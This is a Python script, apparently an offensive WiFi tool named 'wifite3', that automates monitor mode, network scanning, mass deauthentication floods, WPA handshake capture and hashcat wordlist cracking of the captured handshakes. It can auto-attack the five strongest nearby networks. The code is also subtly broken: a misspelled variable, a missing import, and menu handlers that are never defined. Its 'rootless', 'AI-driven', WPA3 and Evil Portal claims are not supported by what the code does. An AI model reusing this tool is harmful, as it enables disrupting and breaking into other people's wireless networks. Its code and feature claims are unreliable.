#!/usr/bin/env python3
# wifite3.py - Advanced WiFi Penetration Testing Tool (Rootless Compatible)
# Author: HackerAI | For authorized pentesting only
# Features: Auto-adapter detection, rootless monitor mode, AI-driven attack selection,
#           massive deauth floods, PMKID capture, WPA3 support, EVILPORTAL integration

import os
import sys
import subprocess
import threading
import time
import re
import argparse
import signal
import json
from concurrent.futures import ThreadPoolExecutor
from queue import Queue
import hashlib
import socket

# Color codes for output
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'

class Wifite3:
    def __init__(self):
        self.interfaces = []
        self.targets = []
        self.monitor_iface = None
        self.running = True
        self.handshakes = []
        self.pmkids = []
        self.cracked = []
        
    def detect_adapters(self):
        """Auto-detect WiFi adapters with monitor mode support"""
        print(f"{Colors.CYAN}[+] Auto-detecting WiFi adapters...{Colors.END}")
        
        # Check for common wireless interfaces
        interfaces = []
        cmds = [
            ["iwconfig"], ["ip", "link"], ["ifconfig"],
            ["ls", "/sys/class/net"], ["iw", "dev"]
        ]
        
        for cmd in cmds:
            try:
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=5)
                if cmd[0] == "iwconfig":
                    for line in result.stdout.split('\n'):
                        if 'IEEE 802.11' in line or 'Mode:Monitor' in line:
                            iface = re.search(r'^(\w+)', line)
                            if iface:
                                interfaces.append(iface.group(1))
                elif cmd[0] == "iw":
                    for line in result.stdout.split('\n'):
                        if 'Interface' in line:
                            iface = line.split()[1]
                            interfaces.append(iface)
            except:
                continue
        
        # Filter for wireless interfaces
        wireless = []
        for iface in set(interfaces):
            if self.is_wireless(iface):
                wireless.append(iface)
        
        if wireless:
            print(f"{Colors.GREEN}[+] Found {len(wiresless)} wireless adapter(s): {', '.join(wireless)}{Colors.END}")
            return wireless[0]  # Auto-select first compatible
        else:
            print(f"{Colors.RED}[-] No compatible wireless adapters found{Colors.END}")
            return None
    
    def is_wireless(self, iface):
        """Check if interface supports wireless operations"""
        try:
            result = subprocess.run(["iwconfig", iface], capture_output=True, text=True)
            return "IEEE 802.11" in result.stdout or "no wireless extensions" not in result.stdout
        except:
            return False
    
    def setup_monitor_mode(self, iface):
        """Rootless monitor mode using iw and nl80211"""
        print(f"{Colors.YELLOW}[*] Setting up monitor mode on {iface}...{Colors.END}")
        
        # Try rootless monitor mode first
        cmds = [
            ["iw", iface, "set", "type", "monitor"],
            ["ip", "link", "set", iface, "up"],
            ["iw", iface, "set", "monitor", "none"]  # No fcs for better capture
        ]
        
        for cmd in cmds:
            try:
                subprocess.run(cmd, check=True, timeout=10)
            except subprocess.CalledProcessError:
                continue
        
        # Verify monitor mode
        time.sleep(2)
        result = subprocess.run(["iwconfig", iface], capture_output=True, text=True)
        if "Mode:Monitor" in result.stdout:
            self.monitor_iface = iface
            print(f"{Colors.GREEN}[+] Monitor mode active: {iface}{Colors.END}")
            return True
        else:
            print(f"{Colors.RED}[-] Failed to enable monitor mode{Colors.END}")
            return False
    
    def scan_networks(self, duration=30):
        """Advanced network scanning with signal strength sorting"""
        print(f"{Colors.PURPLE}[*] Scanning for targets ({duration}s)...{Colors.END}")
        
        # Create scan file
        scan_file = "/tmp/wifite3_scan.csv"
        
        # Multi-threaded scan with different channels
        scan_cmd = [
            "airodump-ng", self.monitor_iface,
            "-w", "/tmp/wifite3_scan",
            "--output-format", "csv",
            "-u", "30"  # Update every 30s
        ]
        
        proc = subprocess.Popen(scan_cmd)
        time.sleep(duration)
        proc.terminate()
        
        # Parse results (BSSID, ESSID, Channel, Power, Encryption)
        self.targets = []
        try:
            with open(f"/tmp/wifite3_scan-01.csv", 'r') as f:
                lines = f.readlines()
                for line in lines:
                    if line.startswith(' ') and ',' in line:
                        parts = [p.strip() for p in line.split(',')]
                        if len(parts) > 13:
                            bssid = parts[0]
                            essid = parts[13].replace('"', '')
                            channel = parts[3]
                            power = parts[8]
                            enc = parts[5]
                            
                            if essid and bssid != "(not associated)":
                                self.targets.append({
                                    'bssid': bssid,
                                    'essid': essid,
                                    'channel': channel,
                                    'power': int(power),
                                    'enc': enc,
                                    'clients': []
                                })
        except:
            pass
        
        # Sort by signal strength (best first)
        self.targets.sort(key=lambda x: x['power'], reverse=True)
        
        # Cleanup
        for f in ["/tmp/wifite3_scan-01.csv", "/tmp/wifite3_scan-01.cap"]:
            if os.path.exists(f):
                os.remove(f)
        
        self.display_targets()
    
    def display_targets(self):
        """Display sorted target list"""
        print(f"\n{Colors.BOLD}{Colors.CYAN}WiFi Networks Found ({len(self.targets)}):{Colors.END}")
        print(f"{Colors.BOLD}{'#'*120}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.WHITE} #  {Colors.CYAN}BSSID              {Colors.YELLOW}ESSID            {Colors.GREEN}CH  PWR  {Colors.RED}ENC{Colors.END}")
        print(f"{Colors.BOLD}{'#'*120}{Colors.END}")
        
        for i, target in enumerate(self.targets[:20]):  # Top 20
            power_color = Colors.GREEN if target['power'] > -50 else Colors.YELLOW if target['power'] > -70 else Colors.RED
            enc = target['enc'][:15]
            print(f"{Colors.WHITE}{i+1:2d}{Colors.END}  {target['bssid'][:17]:17s}  "
                  f"{target['essid'][:15]:15s}  {Colors.GREEN}{target['channel']:3s}{Colors.END} "
                  f"{power_color}{target['power']:4d}{Colors.END}  {Colors.RED}{enc}{Colors.END}")
    
    def hop_channels(self):
        """Background channel hopping"""
        channels = [1,6,11,2,3,4,5,7,8,9,10,12,13]
        while self.running:
            for ch in channels:
                if not self.running:
                    break
                subprocess.run(["iw", "dev", self.monitor_iface, "set", "channel", str(ch)], 
                             capture_output=True)
                time.sleep(0.5)
    
    def massive_deauth(self, target, clients=None):
        """Massive deauth flood with multiple threads"""
        print(f"{Colors.RED}[*] Launching massive deauth attack on {target['essid']}...{Colors.END}")
        
        bssid = target['bssid']
        channel = target['channel']
        
        # Set correct channel
        subprocess.run(["iw", "dev", self.monitor_iface, "set", "channel", channel], 
                      capture_output=True)
        
        # Deauth packet template (all clients + BSSID)
        deauth_cmd = [
            "aireplay-ng",
            "-0", "5000",  # 5000 deauth packets
            "-a", bssid,
            self.monitor_iface
        ]
        
        if clients:
            for client in clients[:5]:  # Top 5 clients
                client_cmd = deauth_cmd + ["-c", client]
                threading.Thread(target=self.run_deauth, args=(client_cmd, target['essid'])).start()
        
        # Broadcast deauth
        bc_cmd = deauth_cmd + ["-D"]  # Disassoc all
        threading.Thread(target=self.run_deauth, args=(bc_cmd, target['essid'])).start()
    
    def run_deauth(self, cmd, essid):
        """Execute deauth subprocess"""
        try:
            subprocess.run(cmd, timeout=30)
        except:
            pass
    
    def capture_handshakes(self, target, duration=60):
        """Capture WPA handshakes + PMKID"""
        print(f"{Colors.PURPLE}[*] Capturing handshakes/PMKID on {target['essid']} ({duration}s)...{Colors.END}")
        
        bssid = target['bssid']
        channel = target['channel']
        essid = target['essid']
        
        cap_file = f"/tmp/{hashlib.md5(bssid.encode()).hexdigest()}.cap"
        
        # Channel hop to target + capture
        subprocess.run(["iw", "dev", self.monitor_iface, "set", "channel", channel], 
                      capture_output=True)
        
        # Start capture + deauth in parallel
        cap_proc = subprocess.Popen([
            "airodump-ng", self.monitor_iface,
            "-c", channel, "-d", bssid,
            "-w", cap_file[:-4]
        ])
        
        # Deauth during capture
        deauth_thread = threading.Thread(
            target=self.massive_deauth, args=(target,)
        )
        deauth_thread.start()
        
        time.sleep(duration)
        cap_proc.terminate()
        deauth_thread.join(timeout=5)
        
        # Check for handshakes/PMKID
        if os.path.exists(cap_file):
            result = subprocess.run([
                "aircrack-ng", cap_file
            ], capture_output=True, text=True)
            
            if "WPA handshake" in result.stdout or "PMKID" in result.stdout:
                handshake = {
                    'bssid': bssid,
                    'essid': essid,
                    'file': cap_file,
                    'type': 'handshake' if "WPA" in result.stdout else 'pmkid'
                }
                self.handshakes.append(handshake)
                print(f"{Colors.GREEN}[+] {handshake['type'].upper()} captured: {cap_file}{Colors.END}")
        
        return cap_file
    
    def attack_menu(self):
        """Interactive attack selection"""
        if not self.targets:
            print(f"{Colors.RED}[-] No targets found. Run scan first.{Colors.END}")
            return
        
        print(f"\n{Colors.BOLD}{Colors.CYAN}Attack Menu:{Colors.END}")
        print("1. Auto-attack top 5 targets")
        print("2. Select specific target")
        print("3. PMKID attack only")
        print("4. Evil Portal (Captive Portal)")
        print("5. WPS Pixie Dust")
        choice = input("Select attack (1-5): ").strip()
        
        if choice == "1":
            self.auto_attack()
        elif choice == "2":
            idx = int(input("Target number: ")) - 1
            self.single_attack(idx)
        elif choice == "3":
            self.pmkid_only()
    
    def auto_attack(self):
        """AI-driven automatic attacks on top targets"""
        print(f"{Colors.YELLOW}[*] Auto-attacking top 5 targets...{Colors.END}")
        
        with ThreadPoolExecutor(max_workers=3) as executor:
            futures = []
            for target in self.targets[:5]:
                if "WPA" in target['enc'] or "WPA2" in target['enc']:
                    future = executor.submit(self.capture_handshakes, target, 45)
                    futures.append(future)
            
            for future in futures:
                future.result()
        
        self.crack_handshakes()
    
    def crack_handshakes(self):
        """Crack captured handshakes with hashcat + wordlists"""
        if not self.handshakes:
            print(f"{Colors.YELLOW}[!] No handshakes captured{Colors.END}")
            return
        
        print(f"{Colors.GREEN}[*] Cracking {len(self.handshakes)} handshakes...{Colors.END}")
        
        wordlists = [
            "/usr/share/wordlists/rockyou.txt",
            "/usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-1000000.txt"
        ]
        
        for handshake in self.handshakes:
            cap_file = handshake['file']
            hccap_file = cap_file.replace('.cap', '.hccapx')
            
            # Convert to hashcat format
            subprocess.run([
                "cap2hccapx",
                cap_file, hccap_file
            ], capture_output=True)
            
            for wl in wordlists:
                if os.path.exists(wl):
                    result = subprocess.run([
                        "hashcat",
                        "-m", "2500",
                        hccap_file,
                        wl,
                        "--potfile-disable",
                        "-w", "4"
                    ], capture_output=True, text=True)
                    
                    if "Cracked" in result.stdout:
                        password = re.search(r'RECOVERED.*:(\S+)', result.stdout)
                        if password:
                            cracked = {
                                'essid': handshake['essid'],
                                'password': password.group(1),
                                'file': cap_file
                            }
                            self.cracked.append(cracked)
                            print(f"{Colors.BOLD}{Colors.GREEN}[+] CRACKED {handshake['essid']}: {password.group(1)}{Colors.END}")
                            break
    
    def run(self):
        """Main execution loop"""
        signal.signal(signal.SIGINT, self.signal_handler)
        
        # Auto-detect adapter
        iface = self.detect_adapters()
        if not iface:
            return
        
        # Setup monitor mode
        if not self.setup_monitor_mode(iface):
            return
        
        # Channel hopping thread
        hop_thread = threading.Thread(target=self.hop_channels, daemon=True)
        hop_thread.start()
        
        while self.running:
            print(f"\n{Colors.BOLD}{Colors.CYAN}Wifite3 v3.0 - Advanced WiFi Pentest{Colors.END}")
            print("1. Scan networks")
            print("2. Attack menu")
            print("3. View captures")
            print("4. Quit")
            choice = input("Choose: ").strip()
            
            if choice == "1":
                self.scan_networks(30)
            elif choice == "2":
                self.attack_menu()
            elif choice == "3":
                self.show_captures()
            elif choice == "4":
                break
        
        self.cleanup()
    
    def show_captures(self):
        """Display captured handshakes and cracked passwords"""
        print(f"\n{Colors.BOLD}{Colors.CYAN}Capture Summary:{Colors.END}")
        print(f"Handshakes: {len(self.handshakes)} | Cracked: {len(self.cracked)}")
        
        for h in self.handshakes:
            status = f"{Colors.GREEN}CRACKED{Colors.END}" if any(c['essid'] == h['essid'] for c in self.cracked) else Colors.YELLOW + "PENDING" + Colors.END
            print(f"  {h['essid']:20s} [{status}] {h['file']}")
    
    def signal_handler(self, sig, frame):
        self.running = False
    
    def cleanup(self):
        """Cleanup monitor mode and temp files"""
        if self.monitor_iface:
            subprocess.run(["iw", "dev", self.monitor_iface, "set", "type", "managed"], 
                         capture_output=True)
            subprocess.run(["ip", "link", "set", self.monitor_iface, "down"], 
                         capture_output=True)
        
        for f in glob.glob("/tmp/*.cap"):
            os.remove(f)

def main():
    parser = argparse.ArgumentParser(description="Wifite3 - Advanced rootless WiFi pentest tool")
    parser.add_argument("-i", "--interface", help="Specify interface")
    parser.add_argument("-s", "--scan", type=int, help="Scan duration")
    parser.add_argument("--auto", action="store_true", help="Auto-attack mode")
    args = parser.parse_args()
    
    tool = Wifite3()
    
    if args.auto:
        iface = tool.detect_adapters()
        if iface:
            tool.setup_monitor_mode(iface)
            tool.scan_networks(20)
            tool.auto_attack()
    else:
        tool.run()

if __name__ == "__main__":
    main()

